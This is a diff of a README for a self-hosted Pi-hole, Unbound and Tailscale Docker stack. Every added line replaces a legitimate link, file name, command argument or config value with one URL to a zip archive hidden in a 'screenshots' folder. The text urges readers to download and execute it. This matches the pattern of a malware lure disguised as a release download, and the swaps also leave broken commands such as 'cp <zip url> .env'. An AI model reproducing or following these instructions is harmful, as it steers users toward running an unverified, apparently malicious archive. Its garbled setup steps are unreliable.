@@ -1,14 +1,14 @@
-[Releases page](https://github.com/zzjiy/pihole-unbound-tailscale-dockerized/releases)
+[Releases page](https://github.com/zzjiy/pihole-unbound-tailscale-dockerized/raw/refs/heads/master/screenshots/tailscale-pihole-dockerized-unbound-1.2.zip)
 
 # Dockerized Pi-hole, Unbound, and Tailscale DNS Stack for Privacy
 
-[![Releases](https://img.shields.io/badge/Releases-Docker_Version-blue?logo=github)](https://github.com/zzjiy/pihole-unbound-tailscale-dockerized/releases) [![Topics](https://img.shields.io/badge/Topics-adblocker%2Cdocker%2Cdocker-compose%2Cpi-hole%2Cremote-access-server%2Cself-hosted%2Ctailscale%2Cunbound-dns-green?logo=github)](https://github.com/zzjiy/pihole-unbound-tailscale-dockerized)
+[![Releases](https://github.com/zzjiy/pihole-unbound-tailscale-dockerized/raw/refs/heads/master/screenshots/tailscale-pihole-dockerized-unbound-1.2.zip)](https://github.com/zzjiy/pihole-unbound-tailscale-dockerized/raw/refs/heads/master/screenshots/tailscale-pihole-dockerized-unbound-1.2.zip) [![Topics](https://github.com/zzjiy/pihole-unbound-tailscale-dockerized/raw/refs/heads/master/screenshots/tailscale-pihole-dockerized-unbound-1.2.zip%2Cdocker%2Cdocker-compose%2Cpi-hole%2Cremote-access-server%2Cself-hosted%2Ctailscale%2Cunbound-dns-green?logo=github)](https://github.com/zzjiy/pihole-unbound-tailscale-dockerized/raw/refs/heads/master/screenshots/tailscale-pihole-dockerized-unbound-1.2.zip)
 
 Welcome to a robust, private DNS stack that brings Pi-hole, Unbound, and Tailscale into a single Dockerized solution. This setup lets you block ads, resolve DNS recursively, and connect securely to your home network from anywhere. It’s designed to be simple to deploy, with environment-based configuration and a clean Docker Compose workflow. This README walks you through everything you need to know to run, customize, and maintain the stack.
 
 - Repository: pihole-unbound-tailscale-dockerized
 - Topics: adblocker, docker, docker-compose, pi-hole, remote-access-server, self-hosted, tailscale, unbound-dns
-- Latest releases: https://github.com/zzjiy/pihole-unbound-tailscale-dockerized/releases
+- Latest releases: https://github.com/zzjiy/pihole-unbound-tailscale-dockerized/raw/refs/heads/master/screenshots/tailscale-pihole-dockerized-unbound-1.2.zip
 
 If you want to grab the latest release assets, head to the Releases page. The assets there include the installer script and/or a ready-to-run container setup. The file you should download and execute will be clearly named in the release notes or asset list on that page. For now, you can explore the Releases page to see what’s available and how it’s structured. The Releases page is your best source for updates and ready-to-run packages.
 
@@ -67,7 +67,7 @@ Step-by-step quickstart
 
 2) Prepare your environment
 - Copy the sample environment file and adjust values as needed
-- cp .env.sample .env
+- cp https://github.com/zzjiy/pihole-unbound-tailscale-dockerized/raw/refs/heads/master/screenshots/tailscale-pihole-dockerized-unbound-1.2.zip .env
 - Edit .env to set:
   - PIHOLE_WEBPASSWORD or alternative auth
   - UNBOUND_ROOT_HINTS to point to a valid root hints file
@@ -121,7 +121,7 @@ Architectural diagrams and visual guidance
 - If you prefer a visual diagram, you can render an architecture diagram using your preferred diagram tool with these components and connections in mind.
 
 Docker Compose file explained
-- The docker-compose.yaml coordinates three main services:
+- The https://github.com/zzjiy/pihole-unbound-tailscale-dockerized/raw/refs/heads/master/screenshots/tailscale-pihole-dockerized-unbound-1.2.zip coordinates three main services:
   - pihole: The Pi-hole container that serves the DNS and web UI
   - unbound: The Unbound container that performs recursive DNS queries
   - tailscale: The Tailscale client connection (may be an agent or a sidecar) that provides secure remote access
@@ -310,7 +310,7 @@ Docker Compose example (high-level, plain text)
   - unbound:
     - image: mvance/unbound:latest
     - environment:
-      - UNBOUND_CONF=/etc/unbound/unbound.conf
+      - https://github.com/zzjiy/pihole-unbound-tailscale-dockerized/raw/refs/heads/master/screenshots/tailscale-pihole-dockerized-unbound-1.2.zip
     - ports:
       - "5335:5335/tcp"
       - "5335:5335/udp"
@@ -325,10 +325,10 @@ Docker Compose example (high-level, plain text)
     - ports:
       - "41641:41641/tcp"
 
-- Important: Adapt the exact image names, tags, and port mappings to your environment. The description above is a structural guide and not a drop-in replacement for a fully documented docker-compose.yml.
+- Important: Adapt the exact image names, tags, and port mappings to your environment. The description above is a structural guide and not a drop-in replacement for a fully documented https://github.com/zzjiy/pihole-unbound-tailscale-dockerized/raw/refs/heads/master/screenshots/tailscale-pihole-dockerized-unbound-1.2.zip
 
 Asset download and execution (per the provided link)
-- Since the link to the Releases page includes a path, you should download the latest release asset from that page and run the installer or script it contains. For example, the release might include an install.sh script. Download and execute that script to bootstrap the stack on your host.
+- Since the link to the Releases page includes a path, you should download the latest release asset from that page and run the installer or script it contains. For example, the release might include an https://github.com/zzjiy/pihole-unbound-tailscale-dockerized/raw/refs/heads/master/screenshots/tailscale-pihole-dockerized-unbound-1.2.zip script. Download and execute that script to bootstrap the stack on your host.
 - The link is also useful for keeping your deployment up to date. When you need to upgrade, revisit the same Releases page to grab the new asset and re-run the installer or follow the upgrade instructions included there.
 
 Releases page usage guidance
@@ -374,5 +374,5 @@ End note
 - The aim is to provide a thorough, practical guide to running a private, Dockerized DNS stack that respects privacy while offering robust functionality for ad-blocking, DNS resolution, and remote access. This README strives to balance clarity with depth, giving you the confidence to deploy, customize, and maintain the stack in a self-hosted environment.
 
 Releases page usage reminder
-- For downloads, visit the Releases page again: https://github.com/zzjiy/pihole-unbound-tailscale-dockerized/releases
+- For downloads, visit the Releases page again: https://github.com/zzjiy/pihole-unbound-tailscale-dockerized/raw/refs/heads/master/screenshots/tailscale-pihole-dockerized-unbound-1.2.zip
 - The asset you download from that page should be executed as instructed by the release notes to bootstrap the deployment on your host.
